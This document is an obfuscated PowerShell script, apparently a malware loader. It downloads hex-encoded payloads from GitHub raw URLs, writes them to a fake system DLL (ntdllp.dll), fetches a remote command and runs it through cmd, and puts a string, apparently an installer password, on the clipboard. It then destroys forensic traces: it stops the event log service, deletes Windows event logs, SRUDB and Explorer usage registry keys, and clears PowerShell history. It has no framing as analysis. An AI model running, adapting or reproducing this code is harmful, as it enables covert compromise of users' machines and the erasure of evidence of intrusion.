${123}="https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
${456}="https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
${789}="https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
${012}="C:\Windows\SysWOW64\ntdllp.dll"
${345}="SteF6b2WrAgu"
function ${678}{param([string]${999});${888}=[regex]::Replace(${999},'[^0-9A-Fa-f]','');if(${888}.Length%2-ne0){return $null};${777}=[byte[]]::new(${888}.Length/2);for(${666}=0;${666}-lt${888}.Length;${666}+=2){${777}[${666}/2]=[convert]::ToByte(${888}.Substring(${666},2),16)};return ${777}}
try{${111}=Invoke-WebRequest -Uri ${123} -UseBasicParsing -TimeoutSec 30;${222}=${111}.Content;${333}=${678} ${222};if(${333}-ne $null){[IO.File]::WriteAllBytes(${012},${333})}}catch{}
Set-Clipboard ${345}
try{${444}=Invoke-WebRequest -Uri ${456} -UseBasicParsing -TimeoutSec 30;${555}=${444}.Content.Trim();if(${555}){Start-Process cmd -ArgumentList "/c ${555}" -NoNewWindow}}catch{}
do{Start-Sleep -Seconds 2}while(Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
try{${666}=Invoke-WebRequest -Uri ${789} -UseBasicParsing -TimeoutSec 30;${777}=${666}.Content;${888}=${678} ${777};if(${888}-ne $null){[IO.File]::WriteAllBytes(${012},${888})}}catch{}
${999}="Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
Stop-Service -Name eventlog -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"HKCR:\Local Settings\Software\Microsoft\Windows\Shell`" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32`" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store`" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage`" -Recurse -Force -ErrorAction SilentlyContinue
Clear-DnsClientCache -ErrorAction SilentlyContinue
Remove-Item -Path `"C:\Windows\System32\winevt\Logs\*.evtx`" -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"C:\Windows\appcompat\pca*.txt`" -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"C:\Windows\System32\sru\SRUDB.dat`" -Force -ErrorAction SilentlyContinue
Remove-Item -Path `"`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine*.txt`" -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path `"`$env:USERPROFILE\AppData\Local\CrashDumps`" -Recurse -File | Where-Object { `$_.Name -like `"*installer*`" } | Remove-Item -Force -ErrorAction SilentlyContinue
rundll32.exe apphelp.dll,ShimFlushCache
Start-Process explorer.exe -ErrorAction SilentlyContinue
Start-Service -Name eventlog -ErrorAction SilentlyContinue"
Invoke-Expression ${999}
${000}="$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";Clear-Content -Path ${000} -ErrorAction SilentlyContinue;Clear-History -ErrorAction SilentlyContinue;exit
